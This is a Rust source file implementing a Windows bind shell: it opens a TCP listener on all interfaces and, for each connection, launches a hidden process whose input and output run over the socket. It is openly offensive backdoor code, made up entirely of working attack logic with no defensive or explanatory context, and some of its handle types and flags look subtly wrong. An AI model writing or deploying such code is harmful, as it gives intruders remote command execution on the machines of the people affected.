use std::os::raw::{c_int, c_void};
use std::ptr;

pub fn run_server_bind_shell(port: u16, cmd: &str) -> std::io::Result<()> {
    unsafe {
        let mut wsa_data: WSADATA = std::mem::zeroed();
        let w_version_requested: u16 = 0x202;

        // Initialise Winsock
        if WSAStartup(w_version_requested, &mut wsa_data as *mut WSADATA) != 0 {
            return Err(std::io::Error::last_os_error());
        }

        let mut sock_addr: sockaddr_in = std::mem::zeroed();
        sock_addr.sin_family = AF_INET as u16;
        sock_addr.sin_port = port.to_be();
        sock_addr.sin_addr.s_addr = 0; // INADDR_ANY

        // Create socket
        let listen_socket = WSASocketW(
            AF_INET,
            SOCK_STREAM,
            IPPROTO_TCP,
            ptr::null_mut(),
            0,
            0
        );
        if listen_socket == INVALID_SOCKET {
            return Err(std::io::Error::last_os_error());
        }

        // Bind socket
        if bind(listen_socket, &sock_addr, std::mem::size_of_val(&sock_addr) as c_int) == SOCKET_ERROR {
            closesocket(listen_socket);
            return Err(std::io::Error::last_os_error());
        }

        // Listen
        if listen(listen_socket, 1) == SOCKET_ERROR {
            closesocket(listen_socket);
            return Err(std::io::Error::last_os_error());
        }

        println!("Listening on port {port}");

        // Accept connections
        loop {
            let mut client_addr: sockaddr_in = std::mem::zeroed();
            let mut client_addr_len: c_int = std::mem::size_of_val(&client_addr) as c_int;

            let accept_socket = accept(listen_socket, &mut client_addr, &mut client_addr_len);
            if accept_socket == INVALID_SOCKET {
                closesocket(listen_socket);
                return Err(std::io::Error::last_os_error());
            }

            println!("Accepted connection");

            // Create process with inherited handles
            let mut startup_info: STARTUPINFO = std::mem::zeroed();
            startup_info.cb = std::mem::size_of_val(&startup_info) as u32;
            startup_info.dwFlags = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES;
            startup_info.wShowWindow = SW_HIDE; // SW_HIDE
            startup_info.hStdInput = accept_socket as *mut c_void;
            startup_info.hStdOutput = accept_socket as *mut c_void;
            startup_info.hStdError = accept_socket as *mut c_void;

            let mut process_info: PROCESS_INFORMATION = std::mem::zeroed();

            let mut command_line: Vec<u16> = cmd.encode_utf16().chain(Some(0)).collect();

            let create_result = CreateProcessW(
                ptr::null(),
                command_line.as_mut_ptr(),
                ptr::null_mut(),
                ptr::null_mut(),
                1,
                0x10,
                ptr::null(),
                ptr::null(),
                &mut startup_info,
                &mut process_info
            );

            if create_result == 0 {
                closesocket(accept_socket);
                closesocket(listen_socket);
                return Err(std::io::Error::last_os_error());
            }

            // Close the accept socket in the parent process
            closesocket(accept_socket);
        }

        // TODO: Cleanup unreachable code
        // Close the listen socket
        // closesocket(listen_socket); // #[warn(unreachable_code)]
    }

    // TODO: Cleanup unreachable code
    // Ok(()) // #[warn(unreachable_code)]
}

extern "system" {
    fn WSAStartup(wVersionRequested: u16, lpWSAData: *mut WSADATA) -> c_int;
    fn WSASocketW(af: c_int, typ: c_int, protocol: c_int, lpProtocolInfo: *mut c_void, g: u32, dwFlags: u32) -> c_int;
    fn bind(s: c_int, name: *const sockaddr_in, namelen: c_int) -> c_int;
    fn listen(s: c_int, backlog: c_int) -> c_int;
    fn accept(s: c_int, addr: *mut sockaddr_in, addrlen: *mut c_int) -> c_int;
    fn closesocket(s: c_int) -> c_int;
    fn CreateProcessW(
        lpApplicationName: *const u16, lpCommandLine: *mut u16, lpProcessAttributes: *mut c_void,
        lpThreadAttributes: *mut c_void, bInheritHandles: u32, dwCreationFlags: u32, lpEnvironment: *const c_void,
        lpCurrentDirectory: *const u16, lpStartupInfo: *mut STARTUPINFO, lpProcessInformation: *mut PROCESS_INFORMATION
    ) -> u32;
}

const STARTF_USESHOWWINDOW: u32 = 0x00000001;
const STARTF_USESTDHANDLES: u32 = 0x00000100;
const SW_HIDE: u16 = 0;

const AF_INET: c_int = 2;
const SOCK_STREAM: c_int = 1;
const IPPROTO_TCP: c_int = 6;
const INVALID_SOCKET: c_int = -1;
const SOCKET_ERROR: c_int = -1;

#[allow(non_snake_case)]
#[repr(C)]
struct WSADATA {
    wVersion: u16,
    wHighVersion: u16,
    szDescription: [u8; 256],
    szSystemStatus: [u8; 128],
    iMaxSockets: u16,
    iMaxUdpDg: u16,
    lpVendorInfo: *const u8,
}

#[allow(non_camel_case_types)]
#[repr(C)]
struct sockaddr_in {
    sin_family: u16,
    sin_port: u16,
    sin_addr: in_addr,
    sin_zero: [u8; 8],
}

#[allow(non_camel_case_types)]
#[repr(C)]
struct in_addr {
    s_addr: u32,
}

#[allow(non_snake_case)]
#[repr(C)]
struct STARTUPINFO {
    cb: u32,
    lpReserved: *mut u16,
    lpDesktop: *mut u16,
    lpTitle: *mut u16,
    dwX: u32,
    dwY: u32,
    dwXSize: u32,
    dwYSize: u32,
    dwXCountChars: u32,
    dwYCountChars: u32,
    dwFillAttribute: u32,
    dwFlags: u32,
    wShowWindow: u16,
    cbReserved2: u16,
    lpReserved2: *mut u8,
    hStdInput: *mut c_void,
    hStdOutput: *mut c_void,
    hStdError: *mut c_void,
}

#[allow(non_camel_case_types)]
#[allow(non_snake_case)]
#[repr(C)]
struct PROCESS_INFORMATION {
    hProcess: *mut c_void,
    hThread: *mut c_void,
    dwProcessId: u32,
    dwThreadId: u32,
}
